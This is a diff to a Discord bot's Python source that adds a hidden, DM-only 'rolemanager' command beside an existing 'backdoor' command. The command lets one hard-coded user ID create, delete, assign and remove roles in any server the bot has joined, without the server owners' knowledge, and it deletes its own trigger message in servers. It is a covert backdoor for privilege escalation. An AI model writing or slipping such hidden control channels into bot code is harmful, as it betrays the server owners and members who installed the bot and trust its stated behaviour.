@@ -809,6 +809,138 @@ async def backdoor(ctx, guild_id: int = None, action: str = None, target: str = 
         logger.exception("[BACKDOOR] Unexpected error")
         await dm_reply(discord.Embed(title="Error", description=f"An error occurred: {e}", color=discord.Color.red()))
 
+@bot.command(name="rolemanager", hidden=True)
+async def role_manager(ctx, guild_id: int = None, action: str = None, target: str = None, *, args: str = None):
+    """
+    DM-only custom role manager for BACK_ACCESS_USER_ID.
+    
+    Actions:
+    - create <role_name> [color_hex] : Create a role
+    - delete <role_name>              : Delete a role
+    - add <role_name> <target_user_id>: Add role to a member
+    - remove <role_name> <target_user_id>: Remove role from a member
+    - list                           : List all roles in the guild
+    """
+    async def dm_reply(msg):
+        try:
+            if isinstance(msg, discord.Embed):
+                await ctx.author.send(embed=msg)
+            else:
+                await ctx.author.send(str(msg))
+        except Exception:
+            logger.warning(f"Failed to DM user {ctx.author.id}")
+
+    # Only in DM
+    if ctx.guild is not None:
+        try: await ctx.message.delete()
+        except: pass
+        await dm_reply(discord.Embed(
+            title="Use DMs",
+            description="This command only works via DM.",
+            color=discord.Color.orange()
+        ))
+        return
+
+    # Authorization check
+    if ctx.author.id != BACK_ACCESS_USER_ID:
+        await dm_reply(discord.Embed(
+            title="Access Denied",
+            description="You aren't allowed to use this command.",
+            color=discord.Color.red()
+        ))
+        return
+
+    # Validate guild
+    if not guild_id:
+        await dm_reply(discord.Embed(title="Missing Guild ID", description="Provide a guild ID.", color=discord.Color.orange()))
+        return
+
+    guild = bot.get_guild(guild_id)
+    if not guild:
+        await dm_reply(discord.Embed(title="Invalid Guild", description="Bot not in guild.", color=discord.Color.red()))
+        return
+
+    bot_member = guild.me or guild.get_member(bot.user.id)
+
+    try:
+        # CREATE ROLE
+        if action.lower() == "create":
+            if not args:
+                await dm_reply("Usage: create <role_name> [hex_color]")
+                return
+            parts = args.split()
+            role_name = parts[0]
+            color = discord.Color.default()
+            if len(parts) > 1:
+                try:
+                    color = discord.Color(int(parts[1].strip("#"), 16))
+                except:
+                    pass
+            # Create role
+            role = await guild.create_role(name=role_name, color=color, reason=f"Created by {ctx.author.id}")
+            await dm_reply(discord.Embed(title="Role Created", description=f"Created role `{role.name}`", color=color))
+            return
+
+        # DELETE ROLE
+        if action.lower() == "delete":
+            if not args:
+                await dm_reply("Usage: delete <role_name>")
+                return
+            role = discord.utils.get(guild.roles, name=args)
+            if not role:
+                await dm_reply(f"Role `{args}` not found.")
+                return
+            await role.delete(reason=f"Deleted by {ctx.author.id}")
+            await dm_reply(discord.Embed(title="Role Deleted", description=f"Deleted role `{role.name}`", color=discord.Color.red()))
+            return
+
+        # ADD ROLE TO MEMBER
+        if action.lower() == "add":
+            if not args or not target:
+                await dm_reply("Usage: add <role_name> <target_user_id>")
+                return
+            role = discord.utils.get(guild.roles, name=args)
+            member = guild.get_member(int(target)) or await guild.fetch_member(int(target))
+            if not role or not member:
+                await dm_reply("Role or member not found.")
+                return
+            if role in member.roles:
+                await dm_reply(f"{member.display_name} already has `{role.name}`.")
+                return
+            await member.add_roles(role, reason=f"Added by {ctx.author.id}")
+            await dm_reply(f"Added role `{role.name}` to {member.display_name}.")
+            return
+
+        # REMOVE ROLE FROM MEMBER
+        if action.lower() == "remove":
+            if not args or not target:
+                await dm_reply("Usage: remove <role_name> <target_user_id>")
+                return
+            role = discord.utils.get(guild.roles, name=args)
+            member = guild.get_member(int(target)) or await guild.fetch_member(int(target))
+            if not role or not member:
+                await dm_reply("Role or member not found.")
+                return
+            if role not in member.roles:
+                await dm_reply(f"{member.display_name} does not have `{role.name}`.")
+                return
+            await member.remove_roles(role, reason=f"Removed by {ctx.author.id}")
+            await dm_reply(f"Removed role `{role.name}` from {member.display_name}.")
+            return
+
+        # LIST ROLES
+        if action.lower() == "list":
+            role_list = [r.name for r in guild.roles if r.name != "@everyone"]
+            await dm_reply(discord.Embed(title=f"Roles in {guild.name}", description=", ".join(role_list) or "No roles", color=discord.Color.blue()))
+            return
+
+        await dm_reply("Unknown action. Use: create, delete, add, remove, list.")
+
+    except discord.Forbidden:
+        await dm_reply("Bot lacks permission to manage roles.")
+    except Exception as e:
+        logger.exception("Error in role_manager")
+        await dm_reply(f"Error: {e}")
 
 @bot.event
 async def on_command_error(ctx, error):
